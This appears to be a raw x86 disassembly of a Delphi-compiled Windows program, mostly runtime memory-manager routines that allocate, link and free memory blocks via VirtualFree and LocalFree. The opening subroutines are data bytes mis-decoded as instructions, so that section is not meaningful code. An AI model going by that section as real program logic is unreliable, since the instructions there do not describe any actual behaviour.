sub_4010d4
adc [ eax ] al
add eax 0x736c6146
add al 0x54
jb r-xdata
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
mov eax eax
call 0xa4050f9
push es
push ebx
je r-xdata
add al 0xf8
jmp sub_4059fc
je r-xdata
inc eax
add [ edi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edi * 2 + 0x11 ] si
inc eax
add [ edi ] al
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
fdiv [ edx ]
imul ebp [ esi + 0x67 ] r-xdata
or ecx [ edx ]
push edi
imul esp [ ebp + 0x53 ] 0x6e697274
add al 0x11
inc esp
and al 0x4
clc
jmp sub_4059d4
insd
add [ eax ] al
cwde
adc [ eax ] eax
je r-xdata
popad
outsb
je r-xdata
insd
add al 0x0
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp * 2 + 0x11 ] si
inc eax
add [ eax ] al
adc [ eax ] eax
pop es
popad
jb r-xdata
inc eax
add [ ecx + edx ] dl
inc eax
add [ edx + ecx ] cl
dec edi
insb
push esi
popad
jb r-xdata
inc eax
add [ edi + eax ] cl
push esi
popad
jb r-xdata
imul ebp [ esi + 0x61 ] 0x56c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
popad
outsb
je r-xdata
jns r-xdata
adc [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
adc [ eax ] eax
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ 0x353c0040 ] dh
inc eax
add [ eax + 0x35 ] al
sub_401215
cmc
adc [ eax ] eax
call [ ecx ]
inc eax
add [ ecx ] cl
adc al [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
adc eax 0x8004012
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x12900040 ] cl
inc eax
add [ ecx ] ah
adc al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
adc al [ eax ]
or al 0x0
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0x59a80040
inc eax
add [ ecx + ebx * 2 + 0x35440040 ] dh
inc eax
add [ eax ] bh
xor eax 0x59c40040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ ecx ] dl
push esp
dec ecx
outsb
je r-xdata
sar bh 0x25
jb r-xdata
fcom [ ecx - 0x3f74ffb9 ]
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub_401420
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_4013e0
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_401478
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401420
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_4014c0
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
add eax [ esi + 0x4 ]
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov eax ebx
call sub_4014a8
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_4014a8
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ esi ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jne r-xdata
mov edx esi
mov eax ebp
call sub_401478
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401530
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx esi
mov edi [ edx + 0x4 ]
add ecx edi
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
mov edi [ ebx + 0x8 ]
add edi [ ebx + 0xc ]
sub edi ecx
mov [ esp + 0x4 ] edi
sub esi eax
mov [ ebx + 0xc ] esi
mov edx esp
mov eax ebx
call sub_401478
test al al
jne r-xdata
sub [ ebx + 0xc ] edi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_4014a8
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4015c4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401478
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_4013f0
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401628
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_4013f0
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_4013f0
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_401478
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_4016a0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_4014a8
mov [ rw-data ] 0x1
sub_401758
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_4013f0
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_4017ec
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_40186c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_4015c4
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_401758
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_4014c0
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_4016a0
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_4014a8
jmp r-xdata
sub_4018fc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_401628
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_4014c0
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_401628
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016a0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_4014c0
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_401758
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_4016a0
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4014a8
jmp r-xdata
sub_401a20
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_4017ec
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_4014c0
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_4016a0
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401530
jmp r-xdata
sub_401aac
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401b62
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_401400
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_401470
mov eax rw-data
call sub_401470
mov eax rw-data
call sub_401470
push 0xff8
push 0x0
call sub_4013e0
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_401408
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401b69
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_401410
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401b70
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401c46
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_401408
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_401470
mov eax rw-data
call sub_401470
mov eax rw-data
call sub_401470
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_401418
retn
push rw-data
call sub_401410
sub_401c50
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401cb4
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401ce4
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401eb8
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401d38
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401d14
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401d60
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401c50
add ebx esi
mov [ rw-data ] 0x6
sub_401dd0
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401c50
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401e08
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401cb4
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401a20
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401a20
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401ce4
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401530
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401d38
sub_401eb8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401e08
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401f40
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401d14
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401f8c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401f40
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_4014c0
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401d60
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401dd0
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401ce4
sub [ edi + 0x4 ] 0x4
sub_402018
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_40186c
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f8c
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_402044
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_4018fc
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f8c
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_402078
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
jg r-xdata
add eax 0x3
mov eax edx
retn
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
jne r-xdata
inc eax
cmp eax 0x401
jne r-xdata
sub_4020a4
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi rw-data
mov ebp rw-data
mov eax ebx
call sub_401c50
mov edx [ ebx + 0x8 ]
mov eax edx
sub eax esi
cmp eax 0xc
jl r-xdata
mov ebx [ edi ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov esi edx
cmp ebx [ edi ]
jne r-xdata
mov edx ebx
add edx esi
xchg edx eax
call sub_401eb8
jmp r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
and [ eax ] 0xfffffffe
mov eax [ ebx + 0x4 ]
mov [ edi ] eax
mov eax ebx
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
mov ebx [ ebx + 0x4 ]
cmp esi [ ebx + 0x8 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x8 ] eax
cmp ebx [ edi ]
je r-xdata
cmp esi 0x1000
jg r-xdata
mov [ edi ] ebx
jmp r-xdata
mov eax esi
call sub_402018
test al al
jne r-xdata
mov eax esi
call sub_402078
mov ebx eax
test ebx ebx
jne r-xdata
cmp esi [ ebp ]
jg r-xdata
xor eax eax
jmp r-xdata
mov ebx [ rw-data ]
cmp esi [ ebx + 0x8 ]
jle r-xdata
sub [ ebp ] esi
cmp [ ebp ] 0xc
jge r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
add [ rw-data ] esi
mov edx esi
or edx 0x2
mov [ eax ] edx
add eax 0x4
inc [ rw-data ]
sub esi 0x4
add [ rw-data ] esi
jmp r-xdata
add esi [ ebp ]
xor eax eax
mov [ ebp ] eax
sub_402198
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebx 0x7ffffff8
jle r-xdata
call sub_401aac
test al al
je r-xdata
xor ecx ecx
push ebp
push sub_402314
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
add ebx 0x7
and ebx 0xfffffffc
cmp ebx 0xc
jge r-xdata
push rw-data
call sub_401408
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx 0x1000
jg r-xdata
mov ebx 0xc
cmp ebx [ rw-data ]
jg r-xdata
mov eax ebx
test eax eax
jns r-xdata
mov eax ebx
call sub_4020a4
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub [ rw-data ] ebx
cmp [ rw-data ] 0xc
jge r-xdata
sar eax 0x2
mov edx [ rw-data ]
mov edx [ edx + eax * 4 - 0xc ]
test edx edx
je r-xdata
add eax 0x3
retn
push rw-data
call sub_401410
mov eax [ rw-data ]
add [ rw-data ] ebx
mov edx ebx
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403b20
jmp r-xdata
add ebx [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edx
mov eax esi
add eax ebx
and [ eax ] 0xfffffffe
mov eax [ edx + 0x4 ]
cmp edx eax
jne r-xdata
mov ecx ebx
test ecx ecx
jns r-xdata
mov eax ebx
test eax eax
jns r-xdata
sar ecx 0x2
mov edi [ rw-data ]
mov [ edi + ecx * 4 - 0xc ] eax
mov ecx [ edx ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] eax
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
add ecx 0x3
sar eax 0x2
mov ecx [ rw-data ]
xor edi edi
mov [ ecx + eax * 4 - 0xc ] edi
jmp r-xdata
add eax 0x3
mov eax esi
mov edx [ edx + 0x8 ]
or edx 0x2
mov [ eax ] edx
add eax 0x4
mov [ ebp - 0x4 ] eax
inc [ rw-data ]
sub ebx 0x4
add [ rw-data ] ebx
call sub_403b20
jmp r-xdata
sub_402328
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
push ebp
push sub_4024ba
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_401aac
test al al
jne r-xdata
mov esi ebx
sub esi 0x4
mov ebx [ esi ]
test bl 0x2
jne r-xdata
push rw-data
call sub_401408
mov [ rw-data ] 0x8
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
dec [ rw-data ]
mov eax ebx
and eax 0x7ffffffc
sub eax 0x4
sub [ rw-data ] eax
test bl 0x1
je r-xdata
mov [ rw-data ] 0x9
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
